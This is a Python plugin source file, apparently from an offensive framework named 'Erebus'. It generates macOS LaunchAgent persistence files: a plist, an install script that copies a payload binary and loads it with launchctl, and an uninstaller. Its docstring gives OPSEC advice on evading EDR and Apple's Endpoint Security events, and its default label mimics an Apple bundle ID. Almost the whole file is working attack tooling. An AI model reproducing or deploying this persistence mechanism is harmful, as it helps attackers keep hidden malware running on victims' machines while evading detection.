"""
macOS LaunchAgent persistence plugin (T1543.001).

Produces an XML property list for a user-scope LaunchAgent and an install script
that copies the payload binary and plist into place, then loads it with launchctl.

Install path: ~/Library/LaunchAgents/<label>.plist
Loaded via:   launchctl load ~/Library/LaunchAgents/<label>.plist
              (or automatically on next login via launchd)

OPSEC notes:
  - LaunchAgents fire on user login and (if KeepAlive=true) restart on exit.
  - ~/Library/LaunchAgents/ is world-readable; EDR on macOS scans this directory.
  - Apple Endpoint Security Framework (ESF) generates ES_EVENT_TYPE_NOTIFY_CREATE
    events on plist writes; most macOS EDR products alert on new LaunchAgent plists.
  - Using a label that resembles Apple's own daemon naming (com.apple.*) is commonly
    flagged by detection rules that specifically look for fake Apple bundle IDs.
  - Prefer a less suspicious label pattern: com.<vendor>.<product>.update
  - KeepAlive=false reduces noise; the agent fires once per login rather than
    restarting on crash, avoiding repeated EDR triggers.
  - ThrottleInterval (default 10s) prevents rapid restart loops if the payload exits.
"""

import os
from ..plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_plugin = ErebusPlugin(
    metadata=PluginMetadata(
        name="macOS LaunchAgent Persistence",
        description="Produces a LaunchAgent plist and install script for macOS persistence (T1543.001)",
        author="erebus",
        version="1.0.0",
        category=PluginCategory.OTHER,
        supported_os=["macOS"],
    )
)


_PLIST_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>

    <key>ProgramArguments</key>
    <array>
{program_args}
    </array>

    <key>RunAtLoad</key>
    <{run_at_load}/>

    <key>KeepAlive</key>
    <{keep_alive}/>

    <key>ThrottleInterval</key>
    <integer>{throttle_interval}</integer>

    <key>StandardOutPath</key>
    <string>/dev/null</string>

    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""

_INSTALL_SH_TEMPLATE = """\
#!/bin/bash
# LaunchAgent installer - T1543.001
# Copies payload binary and plist, then loads the agent.

set -e

LABEL="{label}"
PLIST_NAME="${{LABEL}}.plist"
LAUNCH_AGENTS="${{HOME}}/Library/LaunchAgents"
PAYLOAD_DST="{payload_dst}"
PLIST_DST="${{LAUNCH_AGENTS}}/${{PLIST_NAME}}"

# Create destination directory if needed
mkdir -p "${{LAUNCH_AGENTS}}"
mkdir -p "$(dirname "${{PAYLOAD_DST}}")"

# Copy payload binary
cp "{payload_src}" "${{PAYLOAD_DST}}"
chmod +x "${{PAYLOAD_DST}}"

# Copy plist
cp "${{PLIST_NAME}}" "${{PLIST_DST}}"
chmod 644 "${{PLIST_DST}}"

# Load agent (launchctl load deprecated on macOS 11+; bootstrap works on all versions)
if launchctl list "${{LABEL}}" &>/dev/null; then
    launchctl unload "${{PLIST_DST}}" 2>/dev/null || true
fi
launchctl load "${{PLIST_DST}}"

echo "[+] LaunchAgent loaded: ${{LABEL}}"
echo "[+] Payload: ${{PAYLOAD_DST}}"
echo "[+] Plist: ${{PLIST_DST}}"
"""

_UNINSTALL_SH_TEMPLATE = """\
#!/bin/bash
# LaunchAgent uninstaller

LABEL="{label}"
PLIST_DST="${{HOME}}/Library/LaunchAgents/${{LABEL}}.plist"
PAYLOAD_DST="{payload_dst}"

launchctl unload "${{PLIST_DST}}" 2>/dev/null || true
rm -f "${{PLIST_DST}}"
rm -f "${{PAYLOAD_DST}}"

echo "[-] LaunchAgent removed: ${{LABEL}}"
"""


def create_launchagent(payload_path: str, output_dir: str, **kwargs) -> dict:
    """
    Generate macOS LaunchAgent persistence artifacts.

    Args:
        payload_path: Path to the loader binary on the TARGET system (where it will run).
                      Also used as the source for the install script copy operation if
                      payload_src is not provided separately.
        output_dir:   Directory on the BUILD host where output files are written.
        **kwargs:
            label (str):           LaunchAgent label (reverse-DNS bundle ID style).
                                   Default: "com.apple.systemupdate.agent"
            payload_dst (str):     Where the binary lands on the target after install.
                                   Default: same as payload_path.
            payload_src (str):     Source path on the build host for the copy command
                                   in the install script. Default: same as payload_path.
            run_at_load (bool):    Fire on launchctl load. Default: True.
            keep_alive (bool):     Restart on exit. Default: False.
            throttle_interval (int): Min seconds between restarts. Default: 30.
            extra_args (list):     Additional ProgramArguments after the binary path.

    Returns:
        dict with keys:
            plist_path      - path to the generated .plist
            install_sh      - path to the install.sh script
            uninstall_sh    - path to the uninstall.sh script
            label           - LaunchAgent label used
            load_cmd        - manual launchctl load command
            plist_dst       - where the plist lands on the target
    """
    os.makedirs(output_dir, exist_ok=True)

    label: str           = str(kwargs.get("label", "com.apple.systemupdate.agent"))
    payload_dst: str     = str(kwargs.get("payload_dst", payload_path))
    payload_src: str     = str(kwargs.get("payload_src", payload_path))
    run_at_load: bool    = bool(kwargs.get("run_at_load", True))
    keep_alive: bool     = bool(kwargs.get("keep_alive", False))
    throttle: int        = int(kwargs.get("throttle_interval", 30))
    extra_args: list     = list(kwargs.get("extra_args", []))

    # Build ProgramArguments entries
    all_args = [payload_dst] + extra_args
    arg_lines = "\n".join(f"        <string>{a}</string>" for a in all_args)

    plist_content = _PLIST_TEMPLATE.format(
        label=label,
        program_args=arg_lines,
        run_at_load="true" if run_at_load else "false",
        keep_alive="true" if keep_alive else "false",
        throttle_interval=throttle,
    )

    plist_filename = f"{label}.plist"
    plist_path = os.path.join(output_dir, plist_filename)
    with open(plist_path, "w", encoding="utf-8") as fh:
        fh.write(plist_content)

    install_sh_path = os.path.join(output_dir, "install_agent.sh")
    with open(install_sh_path, "w", encoding="utf-8") as fh:
        fh.write(_INSTALL_SH_TEMPLATE.format(
            label=label,
            payload_dst=payload_dst,
            payload_src=payload_src,
        ))
    os.chmod(install_sh_path, 0o755)

    uninstall_sh_path = os.path.join(output_dir, "uninstall_agent.sh")
    with open(uninstall_sh_path, "w", encoding="utf-8") as fh:
        fh.write(_UNINSTALL_SH_TEMPLATE.format(
            label=label,
            payload_dst=payload_dst,
        ))
    os.chmod(uninstall_sh_path, 0o755)

    plist_dst_target = f"${{HOME}}/Library/LaunchAgents/{plist_filename}"

    return {
        "plist_path": plist_path,
        "install_sh": install_sh_path,
        "uninstall_sh": uninstall_sh_path,
        "label": label,
        "load_cmd": f"launchctl load {plist_dst_target}",
        "plist_dst": plist_dst_target,
    }


def register():
    _plugin.register_function("create_launchagent", create_launchagent)
    return _plugin


def on_load():
    return register()
